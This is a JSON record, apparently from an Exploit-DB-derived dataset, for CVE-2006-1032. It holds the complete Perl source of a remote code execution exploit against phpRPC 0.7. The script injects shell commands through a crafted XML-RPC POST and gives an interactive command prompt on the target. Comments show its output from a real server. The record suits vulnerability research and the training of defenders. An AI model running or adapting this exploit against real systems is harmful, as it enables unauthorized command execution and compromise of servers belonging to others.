{
  "id": "1542",
  "title": "phpRPC Library 0.7 - XML Data Decoding Remote Code Execution (1)",
  "cve": "CVE-2006-1032",
  "vuln_type": "rce",
  "code": "#!/usr/bin/perl\r\n#\r\n#root@host [~]# perl rpc.pl phprpc.sourceforge.net /modules/phpRPC/server.php\r\n#--== IHS IRAN HOMELAND SECURITY ==--\r\n#\r\n#phpRPC <= 0.7 commands execute exploit by LorD (http://www.ihs.ir)\r\n#\r\n#[IRAN HOMELAND SECURITY]$ uname -a;id;pwd\r\n#Linux sc8-pr-web9.sourceforge.net 2.6.10-1.771_FC2smp #1 SMP Mon Mar 28 01:10:51 EST 2005 i686 i686 i386 GNU/Linux\r\n#uid=65534(nfsnobody) gid=65534(nfsnobody) groups=65534(nfsnobody)\r\n#/home/groups/p/ph/phprpc/htdocs/modules/phpRPC\r\n#_end_\r\n#[IRAN HOMELAND SECURITY]$\r\n#\r\n#\r\n# 0rginal Advisory : http://www.gulftech.org/?node=research&article_id=00105-02262006\r\n# Greetz to NT and C0d3r\r\nuse IO::Socket;\r\nprint \"--== IHS IRAN HOMELAND SECURITY ==--\\n\\n\";\r\nprint \"phpRPC <= 0.7 commands execute exploit by LorD (http://www.ihs.ir)\\n\\n\";\r\nif ($ARGV[0] && $ARGV[1])\r\n{\r\n\t$host = $ARGV[0];\r\n\t$xml = $ARGV[1];\r\n\t$sock = IO::Socket::INET->new( Proto => \"tcp\", PeerAddr => \"$host\",\r\n\tPeerPort => \"80\") || die \"connecterror\\n\";\r\n\twhile (1) {\r\n\t\tprint '[IRAN HOMELAND SECURITY]$ ';\r\n\t\t$cmd = <STDIN>;\r\n\t\tchop($cmd);\r\n\t\tlast if ($cmd eq 'exit');\r\n\t\t$xmldata = \"<?xml version=\\\"1.0\\\"?><methodCall><methodName>test.method</methodName><params><param><value><base64>'));echo '_begin_\\n';echo `\".$cmd.\"`;echo '_end_\\n';exit;</param></params></methodCall>\";\r\n\t\tprint $sock \"POST \".$xml.\" HTTP/1.1\\n\";\r\n\t\tprint $sock \"Host: \".$host.\"\\n\";\r\n\t\tprint $sock \"Content-Type: text/xml\\n\";\r\n\t\tprint $sock \"Content-Length:\".length($xmldata).\"\\n\\n\".$xmldata;\r\n\t\t$good=0;\r\n\t\twhile ($ans = <$sock>)\r\n\t\t{\r\n\t\t\tif ($good == 1) { print \"$ans\"; }\r\n\t\t\tlast if ($ans =~ /^_end_/);\r\n\t\t\tif ($ans =~ /^_begin_/) { $good = 1; }\r\n\t\t}\r\n\t\tif ($good==0) {print \"Exploit Failed\\n\";exit();}\r\n\t}\r\n}\r\nelse {\r\n\tprint \"Usage: perl rpc.pl host path_to_phpRPC\\n\\n\";\r\n\tprint \"Example: perl rpc.pl target.com /server.php\\n\";\r\n\texit;\r\n}\r\n\r\n# milw0rm.com [2006-03-01]",
  "url": "https://www.exploit-db.com/exploits/1542"
}